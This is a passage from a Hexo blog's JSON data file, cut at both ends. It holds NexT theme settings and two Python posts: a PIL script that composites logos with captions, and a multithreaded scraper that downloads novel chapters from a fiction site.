itcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":1239,"excerpt":"","more":"<h1 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h1><figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image, ImageFont, ImageDraw</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">fun</span>(<span class=\"params\">img, factor=<span class=\"number\">1</span></span>):</span></span><br><span class=\"line\">    img = img.convert(<span class=\"string\">&#x27;RGBA&#x27;</span>)</span><br><span class=\"line\">    img_blender = Image.new(<span class=\"string\">&#x27;RGBA&#x27;</span>, img.size, (<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>))</span><br><span class=\"line\">    img = Image.blend(img_blender, img, factor)</span><br><span class=\"line\">    img = img.resize((<span class=\"number\">700</span>, <span class=\"number\">700</span>))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> img</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">rootdir = <span class=\"string\">&#x27;logo&#x27;</span></span><br><span class=\"line\">savedir = <span class=\"string\">&#x27;save&#x27;</span></span><br><span class=\"line\">lists = os.listdir(rootdir)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>, len(lists)):</span><br><span class=\"line\">    path = os.path.join(rootdir, lists[i])</span><br><span class=\"line\">    im = Image.open(<span class=\"string\">&#x27;logo.jpg&#x27;</span>)</span><br><span class=\"line\">    im1 = Image.open(path)</span><br><span class=\"line\">    im1 = fun(im1)</span><br><span class=\"line\">    xy = im1.size</span><br><span class=\"line\">    im.paste(im1, (<span class=\"number\">960</span>-xy[<span class=\"number\">0</span>]/<span class=\"number\">2</span>, <span class=\"number\">400</span>-xy[<span class=\"number\">1</span>]/<span class=\"number\">2</span>), mask=im1)</span><br><span class=\"line\">    draw = ImageDraw.Draw(im)</span><br><span class=\"line\">    textsize = <span class=\"number\">24</span></span><br><span class=\"line\">    font = ImageFont.truetype(<span class=\"string\">&quot;C:\\Windows\\Fonts\\Arial.ttf&quot;</span>, textsize)</span><br><span class=\"line\">    length = draw.textsize(lists[i].split(<span class=\"string\">&#x27;.&#x27;</span>)[<span class=\"number\">0</span>], font)</span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        font = ImageFont.truetype(<span class=\"string\">&quot;C:\\Windows\\Fonts\\Arial.ttf&quot;</span>, textsize)</span><br><span class=\"line\">        length = draw.textsize(lists[i].split(<span class=\"string\">&#x27;.&#x27;</span>)[<span class=\"number\">0</span>], font)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (length[<span class=\"number\">0</span>] &lt;= <span class=\"number\">1536</span>) <span class=\"keyword\">and</span> (textsize &lt;= <span class=\"number\">96</span>):</span><br><span class=\"line\">            textsize += <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            textsize -= <span class=\"number\">1</span></span><br><span class=\"line\">            font = ImageFont.truetype(<span class=\"string\">&quot;C:\\Windows\\Fonts\\Arial.ttf&quot;</span>, textsize)</span><br><span class=\"line\">            length = draw.textsize(lists[i].split(<span class=\"string\">&#x27;.&#x27;</span>)[<span class=\"number\">0</span>], font)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    draw.text((<span class=\"number\">960</span>-length[<span class=\"number\">0</span>]/<span class=\"number\">2</span>, <span class=\"number\">860</span>-length[<span class=\"number\">1</span>]/<span class=\"number\">2</span>), lists[i].split(<span class=\"string\">&#x27;.&#x27;</span>)[<span class=\"number\">0</span>], (<span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>), font=font)</span><br><span class=\"line\">    im.save(os.path.join(savedir, lists[i]), <span class=\"string\">&#x27;jpeg&#x27;</span>)</span><br><span class=\"line\">    print(i)</span><br></pre></td></tr></table></figure>"},{"title":"Python多线程爬取小说","date":"2020-04-08T08:08:24.000Z","abbrlink":"fa40ec29","_content":"\\* 爬取网站已转移\n\n```py\nfrom concurrent.futures import ThreadPoolExecutor\nfrom bs4 import BeautifulSoup\nimport requests\nimport random\nimport time\nimport os\nimport re\n\n# Host = 'https://www.biquke.com/bq/37/37868/'\nHost = 'https://www.biquke.com/bq/75/75429/'\n\nheader = [\n    {'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 '\n                   '(KHTML, like Gecko) Chrome/46.0.2490.76 Mobile Safari/537.36'},\n    {'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 '\n                   '(KHTML, like Gecko) Version/5.1 Safari/534.50'},\n    {'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)'},\n    {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1'},\n    {'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)'}\n]\nname = ''\n\n\ndef geturl(url, page):\n    repeat = 0\n    while True:\n        try:\n            req = requests.get(Host + url, headers=header[random.randint(0, 4)], timeout=200)\n            req.close()\n            result = req.content\n            result = BeautifulSoup(result, \"html.parser\")\n            title = result.find('h1').getText()\n            result = result.find('div', {'id': 'content'}).getText()\n            title = re.sub('[\\\\/:*?\"<>|\\r\\n]+', '', title)\n            print(title)\n            with open('./%s/%03d' % (name, page) + ' - ' + title + '.txt', 'w', encoding='utf-8') as file:\n                file.write(result)\n            break\n        except IOError:\n            print('第%d次重连' % repeat)\n            repeat += 1\n            if repeat > 10:\n                print(Host + url + '爬取失败！')\n                break\n            continue\n\n\ndef get_menu():\n    req = requests.get(Host, headers=header[random.randint(0, 4)])\n    html = req.content\n    html = BeautifulSoup(html, \"html.parser\")\n    global name\n    name = str(html.find('h1'))[4:-5]\n    if not os.path.exists(name):\n        os.makedirs(name)\n    html = html.find_all('dd')\n    with ThreadPoolExecutor(1024) as pool:\n        url = []\n        index = []\n        for i, j in enumerate(html):\n            url.append(j.find('a')['href'])\n            index.append(i)\n        pool.map(geturl, url, index)\n\n\nif __name__ == '__main__':\n    start = time.time()\n    get_menu()\n    print(\"耗时%s\" % (time.time() - start))\n```","source":"_posts/Python多线程爬取小说.md","raw":"---\ntitle: Python多线程爬取小说\ndate: 2020-04-08 16:08:24\ncategories:\n  - 编程语言\n  - Python\ntags:\n  - Python\n  - 爬虫\n  - 多线程\nabbrlink: fa40ec29\n---\n\\* 爬取网站已转移\n\n```py\nfrom concurrent.futures import ThreadPoolExecutor\nfrom bs4 import BeautifulSoup\nimport requests\nimport random\nimport time\nimport os\nimport re\n\n# Host = 'https://www.biquke.com/bq/37/37868/'\nHost = 'https://www.biquke.com/bq/75/75429/'\n\nheader = [\n    {'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 '\n                   '(KHTML, like Gecko) Chrome/46.0.2490.76 Mobile Safari/537.36'},\n    {'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 '\n                   '(KHTML, like Gecko) Version/5.1 Safari/534.50'},\n    {'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)'},\n    {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1'},\n    {'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)'}\n]\nname = ''\n\n\ndef geturl(url, page):\n    repeat = 0\n    while True:\n        try:\n            req = requests.get(Host + url, headers=header[random.randint(0, 4)], timeout=200)\n            req.close()\n            result = req.content\n            result = BeautifulSoup(result, \"html.parser\")\n            title = result.find('h1').getText()\n            result = result.find('div', {'id': 'content'}).getText()\n            title = re.sub('[\\\\/:*?\"<>|\\r\\n]+', '', title)\n            print(title)\n            with open('./%s/%03d' % (name, page) + ' - ' + title + '.txt', 'w', encoding='utf-8') as file:\n                file.write(result)\n            break\n        except IOError:\n            print('第%d次重连' % repeat)\n            repeat += 1\n            if repeat > 10:\n                print(Host + url + '爬取失败！')\n                break\n            continue\n\n\ndef get_menu():\n    req = requests.get(Host, headers=header[random.randint(0, 4)])\n    html = req.content\n    html = BeautifulSoup(html, \"html.parser\")\n    global name\n    name = str(html.find('h1'))[4:-5]\n    if not os.path.exists(name):\n        os.makedirs(name)\n    html = html.find_all('dd')\n    with ThreadPoolExecutor(1024) as pool:\n        url = []\n        index = []\n        for i, j in enumerate(html):\n            url.append(j.find('a')['href'])\n            index.append(i)\n        pool.map(geturl, url, index)\n\n\nif __name__ == '__main__':\n    start = time.time()\n    get_menu()\n    print(\"耗时%s\" % (time.time() - start))\n```","slug":"Python多线程爬取小说","published":1,"updated":"2020-05-11T09:40:32.636Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkbh0020qse5bodygilk","content":"<p>* 爬取网站已转移</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> concurrent.futures <span class=\"keyword\">import</span> ThreadPoolExecutor</span><br><span class=\"line\"><span class=\"keyword\">from</span> bs4 <span class=\"keyword\">import</span> BeautifulSoup</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Host = &#x27;https://www.biquke.com/bq/37/37868/&#x27;</span></span><br><span class=\"line\">Host = <span class=\"string\">&#x27;https://www.biquke.com/bq/75/75429/&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">header = [</span><br><span class=\"line\">    &#123;<span class=\"string\">&#x27;User-Agent&#x27;</span>: <span class=\"string\">&#x27;Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 &#x27;</span></span><br><span class=\"line\">                   <span class=\"string\">&#x27;(KHTML, like Gecko) Chrome/46.0.2490.76 Mobile Safari/537.36&#x27;</span>&#125;,</span><br><span class=\"line\">    &#123;<span class=\"string\">&#x27;User-Agent&#x27;</span>: <span class=\"string\">&#x27;Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 &#x27;</span></span><br><span class=\"line\">                   <span class=\"string\">&#x27;(KHTML, like Gecko) Version/5.1 Safari/534.50&#x27;</span>&#125;,</span><br><span class=\"line\">    &#123;<span class=\"string\">&#x27;User-Agent&#x27;</span>: <span class=\"string\">&#x27;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)&#x27;</span>&#125;,</span><br><span class=\"line\">    &#123;<span class=\"string\">&#x27;User-Agent&#x27;</span>: <span class=\"string\">&#x27;Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1&#x27;</span>&#125;,</span><br><span class=\"line\">    &#123;<span class=\"string\">&#x27;User-Agent&#x27;</span>: <span class=\"string\">&#x27;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)&#x27;</span>&#125;</span><br><span class=\"line\">]</span><br><span class=\"line\">name = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">geturl</span>(<span class=\"params\">url, page</span>):</span></span><br><span class=\"line\">    repeat = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            req = requests.get(Host + url, headers=header[random.randint(<span class=\"number\">0</span>, <span class=\"number\">4</span>)], timeout=<span class=\"number\">200</span>)</span><br><span class=\"line\">            req.close()</span><br><span class=\"line\">            result = req.content</span><br><span class=\"line\">            result = BeautifulSoup(result, <span class=\"string\">&quot;html.parser&quot;</span>)</span><br><span class=\"line\">            title = result.find(<span class=\"string\">&#x27;h1&#x27;</span>).getText()</span><br><span class=\"line\">            result = result.find(<span class=\"string\">&#x27;div&#x27;</span>, &#123;<span class=\"string\">&#x27;id&#x27;</span>: <span class=\"string\">&#x27;content&#x27;</span>&#125;).getText()</span><br><span class=\"line\">            title = re.sub(<span class=\"string\">&#x27;[\\\\/:*?&quot;&lt;&gt;|\\r\\n]+&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, title)</span><br><span class=\"line\">            print(title)</span><br><span class=\"line\">            <span class=\"keyword\">with</span> open(<span class=\"string\">&#x27;./%s/%03d&#x27;</span> % (name, page) + <span class=\"string\">&#x27; - &#x27;</span> + title + <span class=\"string\">&#x27;.txt&#x27;</span>, <span class=\"string\">&#x27;w&#x27;</span>, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(result)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span> IOError:</span><br><span class=\"line\">            print(<span class=\"string\">&#x27;第%d次重连&#x27;</span> % repeat)</span><br><span class=\"line\">            repeat += <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> repeat &gt; <span class=\"number\">10</span>:</span><br><span class=\"line\">                print(Host + url + <span class=\"string\">&#x27;爬取失败！&#x27;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_menu</span>():</span></span><br><span class=\"line\">    req = requests.get(Host, headers=header[random.randint(<span class=\"number\">0</span>, <span class=\"number\">4</span>)])</span><br><span class=\"line\">    html = req.content</span><br><span class=\"line\">    html = BeautifulSoup(html, <span class=\"string\">&quot;html.parser&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">global</span> name</span><br><span class=\"line\">    name = str(html.find(<span class=\"string\">&#x27;h1&#x27;</span>))[<span class=\"number\">4</span>:<span class=\"number\">-5</span>]</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> os.path.exists(name):</span><br><span class=\"line\">        os.makedirs(name)</span><br><span class=\"line\">    html = html.find_all(<span class=\"string\">&#x27;dd&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">with</span> ThreadPoolExecutor(<span class=\"number\">1024</span>) <span class=\"keyword\">as</span> pool:</span><br><span class=\"line\">        url = []</span><br><span class=\"line\">        index = []</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i, j <span class=\"keyword\">in</span> enumerate(html):</span><br><span class=\"line\">            url.append(j.find(<span class=\"string\">&#x27;a&#x27;</span>)[<span class=\"string\">&#x27;href&#x27;</span>])</span><br><span class=\"line\">            index.append(i)</span><br><span class=\"line\">        pool.map(geturl, url, index)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    start = time.time()</span><br><span class=\"line\">    get_menu()</span><br><span class=\"line\">    print(<span class=\"string\">&quot;耗时%s&quot;</span> % (time.time() - start))</span><br></pre></td></tr></table></figure>","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10